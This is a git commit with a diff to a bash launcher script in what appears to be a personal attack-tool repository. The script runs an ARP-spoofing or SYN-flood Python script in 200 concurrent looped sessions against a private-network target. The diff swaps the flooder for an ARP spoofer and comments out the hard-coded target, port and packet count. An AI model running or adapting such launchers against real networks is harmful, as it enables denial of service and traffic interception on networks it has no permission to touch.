d6883d8854eb03e05f60a3c05fc444f144ec0aba
phoenixyork166 <berlinlee2017@gmail.com>
2024-03-03 01:20:38 +0800

    Arp spoofing Fire-superiority :D

--- Arp-spoofer/fire-superiority-arp.sh
+++ Arp-spoofer/fire-superiority-arp.sh
@@ -4,7 +4,7 @@
 # offering concurrent bash running the same TCP Sync Attack script
 
 # You may try out this Multiplexer on a super-computer :D
-script='./flooder.py';
+script='./arp-spoofer.py';
 
 # Trial & Error tested
 # maximum of 100 sessions can be handled by a 16 CPU + 16GB RAM VM
@@ -12,11 +12,11 @@ sessions=200;
 
 # Attackers' arguments
 #read -p "Enter target IP [192.168.2.65]: " target
-target='192.168.2.240'
+#target='192.168.2.240'
 #read -p "Enter target Port no. [80/8081/8082]: " port
-port=8082;
+#port=8082;
 #read -p "Enter packets to send [999999999]: " pack
-pack=999999999;
+#pack=999999999;
 
 # Trial & Error tested
 # maximum of 100 sessions can be handled by a 16 CPU + 16GB RAM VM
@@ -24,7 +24,7 @@ pack=999999999;
 #read -p "Enter flood sessions [1-999999999]: " sessions;
 
 # Single Terminal Session
-python3 $script $target -a $port -p $pack;
+#python3 $script $target -a $port -p $pack;
 
 # Asynchronous / Concurrent HTTP requests flooding
 # Async Terminal Sessions
@@ -32,7 +32,7 @@ python3 $script $target -a $port -p $pack;
 # Flooding with Tmux
 for ((i=0; i<$sessions; i++));
 do
-    python3 $script $target -a $port -p $pack;
+    python3 $script;
 done
 
 # Asynchronous / Concurrent HTTP requests flooding
